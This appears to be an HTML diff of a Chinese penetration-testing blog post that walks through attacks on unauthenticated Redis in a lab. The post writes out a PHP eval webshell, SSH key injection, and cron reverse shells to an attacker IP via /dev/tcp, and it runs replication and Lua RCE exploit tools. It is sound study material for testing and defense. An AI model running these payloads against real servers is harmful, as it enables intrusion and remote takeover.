@@ -5,8 +5,6 @@
   <!-- SEO相关 -->
   
     
-      <meta name="robots" content="noindex,follow">
-    
   
   <!-- 渲染优化 -->
   <meta http-equiv='x-dns-prefetch-control' content='on' />
@@ -24,7 +22,9 @@
 
   <!-- 页面元数据 -->
   
-  <title>分类：push - F</title>
+  <title>redis常见的几种攻击方式 - F</title>
+  
+    <meta name="keywords" content="redis">
   
 
   
@@ -269,7 +269,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="l_cover">
   
     
-        <div id="half" class='cover-wrapper  focus' style="display: ;">
+        <div id="half" class='cover-wrapper post focus' style="display: ;">
           
             <div id='cover-backstretch'></div>
           
@@ -302,74 +302,248 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="body-wrapper" id="pjax-container">
           
 
-
 <div class='l_main'>
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
   
+
+
+  
+  <div class="article-meta" id="top">
     
-      
-  <section class="post-list">
     
-      
+    
+      <h1 class="title">
+        redis常见的几种攻击方式
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="">
+    <p>请设置文章作者</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class='new-meta-item category'>
+    <a class='notlink'>
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="sep"></span><a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a>
+    </a>
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2021年3月28日</p>
+  </a>
+</div>
+
+          
         
           
         
-      
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/06/12/%E5%BE%AE%E4%BF%A1%E6%B5%8B%E8%AF%95%E6%8E%A5%E5%8F%A3%E6%8E%A8%E9%80%81/">
-        微信测试接口推送
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p><img src="https://i.loli.net/2021/04/25/8nszgOLwbIyDUZG.png" class="lazyload" data-srcset="https://i.loli.net/2021/04/25/8nszgOLwbIyDUZG.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="Alex-Green-Folio-Art-Illustration-Essential-Wine-Guide-Italy"></p>
+      </div>
     
   </div>
+
+
   
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-06-12</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/python/">python</a><span class="sep"></span><a class="category-link" href="/categories/python/push/">push</a>
-        
-      </div>
+  
+  <p><img src="https://i.loli.net/2021/05/28/nzRGWrXPHj5MqK2.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/05/28/nzRGWrXPHj5MqK2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="Alexander-Wells-Folio-illustration-Exploration-Team-1"></p>
+<span id="more"></span>
+
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>redis默认端口是6379，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上；如果设置了空密码或密码为弱口令的情况下，会导致用户访问redis并进行一些攻击行为。</p>
+<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">服务机</span><br><span class="line">ubuntu16.04</span><br><span class="line">192.168.3.132</span><br><span class="line"></span><br><span class="line">攻击机</span><br><span class="line">kali</span><br><span class="line">192.168.3.130</span><br></pre></td></tr></table></figure>
+
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>redis版本为2.8.4</p>
+<p><img src="https://i.loli.net/2021/05/28/rI1j6bkMP7EnGst.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/28/rI1j6bkMP7EnGst.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="redis版本"></p>
+<p>未授权</p>
+<p><img src="https://i.loli.net/2021/05/28/cIXAasDPpd1iMSv.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/28/cIXAasDPpd1iMSv.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="redis未受权"></p>
+<h5 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h5><h6 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h6><ul>
+<li>web物理路径</li>
+<li>目录写入权限</li>
+</ul>
+<h6 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.3.132</span><br><span class="line">&gt; config set dir &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;&quot;</span><br><span class="line">&gt; config set dbfilename test.php</span><br><span class="line">&gt; set x &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot;</span><br><span class="line">&gt; save</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/05/28/BemLnT8J2hRrFxG.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/28/BemLnT8J2hRrFxG.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1未授权文件写入"></p>
+<p>也可以使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set x &quot;\r\n\r\n&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;\r\n\r\n&quot;</span><br></pre></td></tr></table></figure>
+
+<p>\r\n\r\n代表换行的意思，用redis写入的文件会自带一些版本信息，如果不换行可能会导致无法执行</p>
+<p>文件写入成功</p>
+<p><img src="https://i.loli.net/2021/05/28/nj2KYfCI6LNXJz5.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/28/nj2KYfCI6LNXJz5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="2未授权文件写入"></p>
+<h5 id="写入ssh公钥"><a href="#写入ssh公钥" class="headerlink" title="写入ssh公钥"></a>写入ssh公钥</h5><p>当redis为root身份运行并且root启用密钥登录，这时可以通过写入ssh公钥文件，直接通过ssh登录目标服务器</p>
+<h6 id="前提-1"><a href="#前提-1" class="headerlink" title="前提"></a>前提</h6><ul>
+<li><p>root权限</p>
+</li>
+<li><p>开启密钥登录</p>
+</li>
+</ul>
+<h6 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h6><p>攻击机生成ssh密钥文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/05/28/Tnb8WBcUdtwoM3Y.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/28/Tnb8WBcUdtwoM3Y.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1写入公钥"></p>
+<p>将公钥内容添加前后换行再输出到pk.txt</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; /root/.ssh/pk.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/05/28/2NMUJsFR7pX1IjB.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/28/2NMUJsFR7pX1IjB.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="2写入公钥"></p>
+<p>将公钥值设置为redis变量，并写入指定目录文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /root/.ssh/pk.txt | redis-cli -h 192.168.3.132 -x set test </span><br><span class="line"></span><br><span class="line">redis-cli -h 192.168.3.132</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> config <span class="built_in">set</span> dir /var/spool/cron</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">set</span> cron <span class="string">&quot;\n\n* * * * * bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.3.130/2343 0&gt;&amp;1&#x27;\n\n&quot;</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> config <span class="built_in">set</span> dbfilename root</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> save</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/05/28/v4oxjL5PhfQdzUE.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/28/v4oxjL5PhfQdzUE.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="3写入公钥"></p>
+<p>查看是否写入成功</p>
+<p><img src="https://i.loli.net/2021/05/28/UzWBHTpQgGiFolR.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/28/UzWBHTpQgGiFolR.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="4写入公钥"></p>
+<p>攻击机使用密钥连接目标机ssh</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i .ssh&#x2F;id_rsa root@192.168.3.132</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/05/28/3FJYClDhBrgIfpj.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/28/3FJYClDhBrgIfpj.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="5写入公钥"></p>
+<h5 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h5><p>通过写入计划任务反弹shell</p>
+<h6 id="前提-2"><a href="#前提-2" class="headerlink" title="前提"></a>前提</h6><ul>
+<li>权限可以写计划任务，计划任务文件权限为600</li>
+</ul>
+<h6 id="利用过程-2"><a href="#利用过程-2" class="headerlink" title="利用过程"></a>利用过程</h6><p>攻击机nc监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 2343</span><br></pre></td></tr></table></figure>
+
+<p>redis写入计划任务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.3.132</span><br><span class="line">&gt; config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs</span><br><span class="line">&gt; set cron &quot;\n\n*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.3.130&#x2F;2343 0&gt;&amp;1\n\n&quot;</span><br><span class="line">&gt; config set dbfilename root</span><br><span class="line">&gt; save</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/05/28/edhi8VxmSH7AKwy.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/28/edhi8VxmSH7AKwy.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1计划任务"></p>
+<p>目标机查看计划任务，显示成功写入</p>
+<p><img src="https://i.loli.net/2021/05/28/p2HtICi6nxPQaEg.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/28/p2HtICi6nxPQaEg.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="2计划任务"></p>
+<p>等待1分钟，成功反弹</p>
+<p><img src="https://i.loli.net/2021/05/28/1MYuBnUPe5XkZlh.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/28/1MYuBnUPe5XkZlh.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="3计划任务"></p>
+<h5 id="主从复制rce"><a href="#主从复制rce" class="headerlink" title="主从复制rce"></a>主从复制rce</h5><p>在redis4.x后，新增了模块功能，通过外部拓展，可以在redis中实现一个新的redis命令</p>
+<h6 id="前提-3"><a href="#前提-3" class="headerlink" title="前提"></a>前提</h6><ul>
+<li>版本范围 4.x-5.0.5</li>
+</ul>
+<h6 id="利用过程-3"><a href="#利用过程-3" class="headerlink" title="利用过程"></a>利用过程</h6><p>通过docker快速搭建漏洞环境，以版本5.0.5为例</p>
+<p><img src="https://i.loli.net/2021/06/01/8HhQKroLT2gaF5X.png" class="lazyload" data-srcset="https://i.loli.net/2021/06/01/8HhQKroLT2gaF5X.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1主从同步rce"></p>
+<p><img src="https://i.loli.net/2021/06/01/GQ9muHhrZN56VJL.png" class="lazyload" data-srcset="https://i.loli.net/2021/06/01/GQ9muHhrZN56VJL.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="2主从同步rce"></p>
+<p>利用工具</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Ridter/redis-rce.git">redis-rce</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git">RedisModules-ExecuteCommand</a></p>
+<p>编译<code>RedisModules-ExecuteCommand</code>中的c文件为so文件</p>
+<p><img src="https://i.loli.net/2021/06/01/pWucDAlCZ13RO9Q.png" class="lazyload" data-srcset="https://i.loli.net/2021/06/01/pWucDAlCZ13RO9Q.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="3主从同步rce"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 redis-rce.py -r 192.168.3.132 -L 192.168.3.130 -f ..&#x2F;RedisModules-ExecuteCommand&#x2F;src&#x2F;module.so</span><br></pre></td></tr></table></figure>
+
+<p>-r 目标主机ip，目标端口非默认可以加-p指定端口，-L攻击机ip，-f redis模块文件</p>
+<p><img src="https://i.loli.net/2021/06/01/ZFlDu7t2HvhmWgQ.png" class="lazyload" data-srcset="https://i.loli.net/2021/06/01/ZFlDu7t2HvhmWgQ.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="4主从同步rce"></p>
+<p>可以用选择<code>i</code>生成交互shell，也可以选择<code>r</code>生成反弹shell</p>
+<p><img src="https://i.loli.net/2021/06/01/SKYtpIMfGoiQrHU.png" class="lazyload" data-srcset="https://i.loli.net/2021/06/01/SKYtpIMfGoiQrHU.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="5主从同步rce"></p>
+<p><img src="https://i.loli.net/2021/06/01/c2uFyAg1QdGe6So.png" class="lazyload" data-srcset="https://i.loli.net/2021/06/01/c2uFyAg1QdGe6So.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="6主从同步rce"></p>
+<h5 id="lua-rce"><a href="#lua-rce" class="headerlink" title="lua rce"></a>lua rce</h5><p>2.6版本开始引入对lua脚本的支持，通过在服务中嵌入lua环境，使redis客户端可以使用lua脚本，从而实现rce</p>
+<h6 id="前提-4"><a href="#前提-4" class="headerlink" title="前提"></a>前提</h6><ul>
+<li>适用于高权限运行的低版本redis的lua虚拟机</li>
+</ul>
+<h6 id="利用过程-4"><a href="#利用过程-4" class="headerlink" title="利用过程"></a>利用过程</h6><p>环境版本为<code>redis 2.6.16</code>，<code>lua 5.1</code></p>
+<p><img src="https://i.loli.net/2021/06/01/cnwqECj8fNrSB2J.png" class="lazyload" data-srcset="https://i.loli.net/2021/06/01/cnwqECj8fNrSB2J.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1lua rce"></p>
+<p><a target="_blank" rel="noopener" href="http://github.com/QAX-A-Team/redis_lua_exploit/">exp</a></p>
+<p><img src="https://i.loli.net/2021/06/01/7CPdH5zugZDa4Kt.png" class="lazyload" data-srcset="https://i.loli.net/2021/06/01/7CPdH5zugZDa4Kt.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="2lua rce"></p>
+<p>修改redis_lua.py中目标机ip及端口</p>
+<p><img src="https://i.loli.net/2021/06/01/DCM6vcIlSLs9Oym.png" class="lazyload" data-srcset="https://i.loli.net/2021/06/01/DCM6vcIlSLs9Oym.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="3lua rce"></p>
+<p>运行脚本，直至出现提示说明成功执行</p>
+<p><img src="https://i.loli.net/2021/06/01/PcpdhqoKE3xJsIi.png" class="lazyload" data-srcset="https://i.loli.net/2021/06/01/PcpdhqoKE3xJsIi.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="4lua rce"></p>
+<p>后可以使用<code>tonumber()</code>来远程执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.3.132</span><br><span class="line">&gt; eval &quot;tonumber(&#39;执行的命令&#39;,8)&quot; 0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/06/01/vJXFbtRlrc1wfAe.png" class="lazyload" data-srcset="https://i.loli.net/2021/06/01/vJXFbtRlrc1wfAe.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="5lua rce"></p>
+<p>成功反弹shell</p>
+<p><img src="https://i.loli.net/2021/06/01/ipHwLFfWu62egXP.png" class="lazyload" data-srcset="https://i.loli.net/2021/06/01/ipHwLFfWu62egXP.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="5lua rce"></p>
+
+  
+  
+    
+    <div class='footer'>
       
-        <div>
-          <a class='readmore' href='/2020/06/12/%E5%BE%AE%E4%BF%A1%E6%B5%8B%E8%AF%95%E6%8E%A5%E5%8F%A3%E6%8E%A8%E9%80%81/'>
-            阅读全文
-          </a>
-        </div>
+      
+      
       
     </div>
   
+  
+    
 
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-06-01T18:23:36+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2021年6月1日</p>
+  </a>
 </div>
 
-          </div>
         
       
-    
-  </section>
+        
+          
   
-    
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/redis/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>redis</p></a></div>
+
+
+        
+      
+        
+      
+    </div>
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+        <a class='prev' href='/2021/04/09/%E7%99%BD%E9%93%B6%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/'>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>白银/黄金票据</p>
+          <p class='content'>
+
+
+前言域内的两种攻击方式: 白银票据(SilverTicket)、黄金票据(GoldenTicket)，横向或权限维持中常用到。利用kerberos认证过程中通过伪造票据来伪造用户
+kerb...</p>
+        </a>
+      
+      
+        <a class='next' href='/2020/08/10/python%E5%AE%9E%E7%8E%B0Typora%E7%B2%98%E8%B4%B4%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87/'>
+          <p class='title'>python实现Typora粘贴上传图片<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>
+
+
+在用Typora编写文本时，实现图片粘贴后自动上传到smms图床并返回url
+项目地址
+设置注册登录自己的smms
+生成Secret Token
+
+将Secret Token替换脚本中的t...</p>
+        </a>
+      
+    </div>
+  
+</article>
+
+
+  
+
   
 
 
-    
-  
+
+
+
+
 </div>
 <aside class='l_side'>
   
@@ -377,138 +551,22 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
 
-<section class="widget blogger shadow desktop mobile">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://i.loli.net/2021/04/28/216QBFqc7OVsxAa.png'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-        
-          <p>秋风瑟瑟,落叶归零</p>
 
-        
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
